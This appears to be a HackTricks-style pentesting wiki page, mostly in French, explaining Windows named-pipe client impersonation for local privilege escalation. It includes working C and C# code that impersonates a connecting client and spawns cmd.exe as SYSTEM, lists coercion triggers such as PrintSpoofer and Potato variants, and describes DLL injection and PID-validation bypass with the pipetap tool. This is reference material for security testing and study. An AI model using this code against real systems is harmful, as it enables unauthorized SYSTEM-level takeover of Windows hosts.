# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation est une primitive d'élévation de privilèges locale qui permet à un thread serveur de named-pipe d'adopter le contexte de sécurité d'un client qui s'y connecte. En pratique, un attaquant capable d'exécuter du code avec SeImpersonatePrivilege peut contraindre un client privilégié (par ex. un service SYSTEM) à se connecter à un pipe contrôlé par l'attaquant, appeler ImpersonateNamedPipeClient, dupliquer le token résultant en un token primaire, et lancer un processus en tant que ce client (souvent NT AUTHORITY\SYSTEM).

Cette page se concentre sur la technique de base. Pour des chaînes d'exploit bout-en-bout qui contraignent SYSTEM à se connecter à votre pipe, voir les pages de la famille Potato référencées ci-dessous.

## TL;DR
- Créez un named pipe : \\.\pipe\<random> et attendez une connexion.
- Forcez un composant privilégié à s'y connecter (spooler/DCOM/EFSRPC/etc.).
- Lisez au moins un message depuis le pipe, puis appelez ImpersonateNamedPipeClient.
- Ouvrez le token d'imitation du thread courant, DuplicateTokenEx(TokenPrimary), et utilisez CreateProcessWithTokenW/CreateProcessAsUser pour obtenir un processus SYSTEM.

## Requirements and key APIs
- Privileges généralement requis par le processus/le thread appelant :
- SeImpersonatePrivilege pour impersonner avec succès un client qui se connecte et pour utiliser CreateProcessWithTokenW.
- Alternativement, après avoir impersonné SYSTEM, vous pouvez utiliser CreateProcessAsUser, ce qui peut nécessiter SeAssignPrimaryTokenPrivilege et SeIncreaseQuotaPrivilege (ces privilèges sont satisfaits lorsque vous impersonnez SYSTEM).
- API principales utilisées :
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (il faut lire au moins un message avant l'imitation)
- ImpersonateNamedPipeClient et RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ou CreateProcessAsUser
- Niveau d'imitation : pour effectuer des actions utiles localement, le client doit permettre SecurityImpersonation (valeur par défaut pour de nombreux clients RPC/named-pipe locaux). Les clients peuvent abaisser ce niveau avec SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION lors de l'ouverture du pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Remarques :
- Si ImpersonateNamedPipeClient renvoie ERROR_CANNOT_IMPERSONATE (1368), assurez-vous de lire d'abord depuis le pipe et que le client n'a pas restreint l'impersonation au niveau Identification.
- Privilégiez DuplicateTokenEx avec SecurityImpersonation et TokenPrimary pour obtenir un token primaire adapté à la création de processus.

## Exemple rapide en .NET
En .NET, NamedPipeServerStream peut impersonate via RunAsClient. Une fois en impersonation, dupliquez le token du thread et créez un processus.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Déclencheurs/coercions courants pour amener SYSTEM vers votre pipe
Ces techniques contraignent des services privilégiés à se connecter à votre named pipe afin que vous puissiez vous faire passer pour eux :
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Voir l'utilisation détaillée et la compatibilité ici :

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Si vous avez seulement besoin d'un exemple complet montrant la création du pipe et l'usurpation pour lancer SYSTEM à partir d'un déclencheur de service, voir :

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Abus de Named Pipe IPC & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Les services renforcés par named-pipe peuvent encore être détournés en instrumentant le client de confiance. Des outils comme [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) déposent une helper DLL dans le client, font office de proxy pour son trafic, et vous permettent d'altérer l'IPC privilégié avant que le service SYSTEM ne le consomme.

### Inline API hooking dans les processus de confiance
- Injectez la helper DLL (OpenProcess → CreateRemoteThread → LoadLibrary) dans n'importe quel client.
- La DLL Detours `ReadFile`, `WriteFile`, etc., mais uniquement lorsque `GetFileType` rapporte `FILE_TYPE_PIPE`, copie chaque buffer/métadonnée vers un control pipe, vous permet d'edit/drop/replay, puis reprend l'API originale.
- Transforme le client légitime en proxy à la Burp : pause des payloads UTF-8/UTF-16/raw, déclenchement de chemins d'erreur, replay de séquences, ou export de traces JSON.

### Mode client distant pour contourner la validation basée sur le PID
- Injectez dans un client allow-listed, puis dans la GUI choisissez le pipe plus ce PID.
- La DLL effectue `CreateFile`/`ConnectNamedPipe` dans le processus de confiance et relaie l'I/O vers vous, de sorte que le serveur observe toujours le PID/image légitime.
- Contourne les filtres qui reposent sur `GetNamedPipeClientProcessId` ou les vérifications d'image signée.

### Énumération rapide et fuzzing
- `pipelist` énumère `\\.\pipe\*`, affiche les ACLs/SIDs, et transfère les entrées vers d'autres modules pour un probing immédiat.
- Le client de pipe/compositeur de messages se connecte à n'importe quel nom et crée des payloads UTF-8/UTF-16/raw-hex ; importer des blobs capturés, muter des champs, et renvoyer pour chasser des deserializers ou des verbes de commande non authentifiés.
- La helper DLL peut héberger un listener TCP loopback afin que des tooling/fuzzers puissent piloter le pipe à distance via le Python SDK.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
Combinez le TCP bridge avec des restaurations de snapshots VM pour crash-tester des parseurs IPC fragiles.

### Operational considerations
- Named pipes are low-latency; long pauses while editing buffers can deadlock brittle services.
- Overlapped/completion-port I/O coverage is partial, so expect edge cases.
- Injection is noisy and unsigned, so treat it as a lab/exploit-dev helper rather than a stealth implant.

## Troubleshooting and gotchas
- You must read at least one message from the pipe before calling ImpersonateNamedPipeClient; otherwise you’ll get ERROR_CANNOT_IMPERSONATE (1368).
- If the client connects with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, the server cannot fully impersonate; check the token’s impersonation level via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requires SeImpersonatePrivilege on the caller. If that fails with ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser after you already impersonated SYSTEM.
- Ensure your pipe’s security descriptor allows the target service to connect if you harden it; by default, pipes under \\.\pipe are accessible according to the server’s DACL.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
